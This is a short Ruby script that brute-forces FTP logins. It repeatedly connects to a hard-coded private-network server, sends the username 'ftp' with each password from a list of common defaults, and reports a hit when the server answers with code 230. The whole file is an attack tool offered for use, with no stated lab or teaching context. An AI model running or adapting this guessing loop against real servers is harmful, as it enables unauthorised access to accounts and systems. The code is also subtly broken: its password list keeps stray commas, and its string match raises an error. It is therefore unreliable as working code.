require 'socket'

def connect(username, pass)
  Socket.tcp('192.168.11.12', 21) do |s|
    msg, _ = s.recvfrom 1024
    puts msg

    s.sendmsg "USER #{username}\r\n"
    s.recvfrom 1024

    s.sendmsg "PASS #{pass}\r\n"
    data, _ = s.recvfrom 3 #only care about response code

    s.sendmsg "QUIT\r\n"
    s.close

    return data
  end
end

username = 'ftp'
passwords = %w(test, password, backup, 12345, root, administrator, admin, ftp)

passwords.each do |pw|
  attempt = connect(username, pw)

  print "[*] password found: #{pw}" if attempt =~ "230"
end